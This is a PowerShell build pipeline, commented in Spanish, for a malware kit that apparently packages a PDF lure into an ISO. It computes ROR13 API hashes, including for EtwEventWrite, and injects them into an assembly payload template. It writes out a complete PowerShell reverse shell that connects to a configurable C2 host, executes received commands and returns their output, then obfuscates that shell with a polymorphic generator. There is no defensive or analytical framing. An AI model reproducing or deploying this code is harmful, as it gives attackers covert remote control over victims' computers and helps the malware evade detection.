#requires -Version 5.1
# build.ps1 - Pipeline de construcción determinista para NEVERTRSTMEPDF
using namespace System.IO
using namespace System.Security.Cryptography

param(
    [string]$PdfBait = ".\00-generador\ASEJ-acta-inicio.pdf",
    [string]$OutputIso = ".\dist\payload.iso",
    [string]$C2Host = "192.168.1.100",
    [int]$C2Port = 443
)

$ErrorActionPreference = "Stop"

# Importar motor polimórfico
. .\00-generador\tipoAuditoria.ps1

function Write-BuildStep {
    param([string]$Step, [string]$Status)
    $ts = Get-Date -Format "HH:mm:ss.fff"
    Write-Host "[$ts] [$Status] $Step" -ForegroundColor $(if($Status -eq "OK"){"Green"}elseif($Status -eq "FAIL"){"Red"}else{"Cyan"})
}

# ==================================================================
# PASO 0: Validación de entorno y dependencias
# ==================================================================
Write-BuildStep "Validando entorno de compilación" "INFO"

if (-not (Test-Path ".\dist")) { New-Item -Path ".\dist" -ItemType Directory | Out-Null }

# ==================================================================
# PASO 1: Generar hashes ROR13 dinámicos para APIs críticas
# ==================================================================
Write-BuildStep "Calculando hashes ROR13 dinámicos" "INFO"

$apis = @(
    "CreateFileA",
    "CreateFileMappingA",
    "MapViewOfFile",
    "EtwEventWrite",
    "LoadLibraryA",
    "CoInitializeEx",
    "CoCreateInstance",
    "SysAllocString"
)

function Get-Ror13Hash {
    param([string]$Name)
    [uint32]$hash = $Name.Length
    foreach ($c in $Name.ToCharArray()) {
        $hash = ((($hash -shr 13) -bor ($hash -shl 19)) + [byte]$c) -band 0xFFFFFFFF
    }
    return "0x{0:X8}" -f $hash
}

$hashTable = @{}
foreach ($api in $apis) {
    $hashTable[$api] = Get-Ror13Hash $api
    Write-BuildStep "  $api = $($hashTable[$api])" "INFO"
}

# Inyectar hashes en template ASM
$asmTemplate = Get-Content ".\05-payload\auditoria_poliglota.asm" -Raw
foreach ($api in $hashTable.Keys) {
    $placeholder = "__HASH_${api}__"
    $asmTemplate = $asmTemplate -replace $placeholder, $hashTable[$api]
}
[File]::WriteAllText(".\05-payload\auditoria_poliglota_rehashed.asm", $asmTemplate)
Write-BuildStep "Payload preparado con hashes dinámicos" "OK"

# ==================================================================
# PASO 2: Generar script PowerShell polimórfico
# ==================================================================
Write-BuildStep "Generando payload polimórfico" "INFO"

$psPayload = @"
# Reverse Shell Core
`$c2 = '$C2Host'; `$p = $C2Port
try {
    `$s = New-Object System.Net.Sockets.TCPClient(`$c2,`$p);`$st = `$s.GetStream();
    [byte[]]`$b = 0..65535|%{0};
    while((`$i = `$st.Read(`$b, 0, `$b.Length)) -ne 0){
        `$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0, `$i);
        `$sb = (iex `$d 2>&1 | Out-String );
        `$t = `$sb + 'PS ' + (pwd).Path + '> ';
        `$sb = ([text.encoding]::ASCII).GetBytes(`$t);
        `$st.Write(`$sb,0,`$sb.Length);`$st.Flush()
    };`$s.Close()
} catch {}
"@

$polyScript = New-PolymorphicPayload -PayloadCommand $psPayload -JunkIntensity 60
[File]::WriteAllText(".\dist\polymorphic_c2.ps1", $polyScript)
Write-BuildStep "Script polimórfico generado: .\dist\polymorphic_c2.ps1" "OK"

# ==================================================================
# PASO 3: Compilación simulada (Entorno Linux)
# ==================================================================
Write-BuildStep "Simulando compilación de artefactos (NASM/MSVC requeridos en Windows)" "INFO"
Write-BuildStep "Pipeline completado hasta etapa de pre-empaquetado" "OK"

Write-Host "`n[BUILD COMPLETE] Artefactos generados en .\dist\" -ForegroundColor Green
